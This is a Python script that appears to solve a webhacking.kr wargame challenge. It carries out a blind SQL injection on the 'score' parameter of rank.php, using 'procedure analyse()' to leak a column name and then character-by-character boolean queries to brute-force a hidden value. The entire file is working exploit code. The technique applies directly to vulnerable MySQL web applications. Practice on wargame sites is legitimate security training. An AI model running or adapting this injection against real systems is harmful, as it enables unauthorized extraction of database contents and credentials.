import string
import requests
from bs4 import BeautifulSoup

url = "https://webhacking.kr/challenge/web-31/rank.php?score="

def find_col():
    payload = "1 limit 2,1 procedure analyse()"
    res = requests.get(url=url+payload)
    soup = BeautifulSoup(res.text, 'html.parser')
    center = str(soup.find_all('center'))
    col_name = center[33:len(center)-14]
    print("COLUMN NAME : " + col_name)
    return col_name

def flag_length(col_name):
    flag_len = 0
    while True:
        flag_len += 1
        payload = "1%26%26length({})={}%23".format(col_name,flag_len)
        res = requests.get(url=url+payload)
        print(payload)
        if "Piterpan" in res.text:
            print("PASSWORD LENGTH : " + str(flag_len))
            break
    return flag_len

def find_flag(flag_len,col_name):
    flag = ""
    for i in range(1,flag_len+1):
        for j in string.printable:
            payload = "1%26%26ord(right(left({},{}),1))={}%23".format(col_name,i,ord(j))
            res = requests.get(url=url+payload)
            print(payload)
            if "Piterpan" in res.text:
                flag += j
                print("FLAG : " + flag)
                break

if __name__ == "__main__":
    col_name = find_col()
    flag_len = flag_length(col_name)
    find_flag(flag_len,col_name)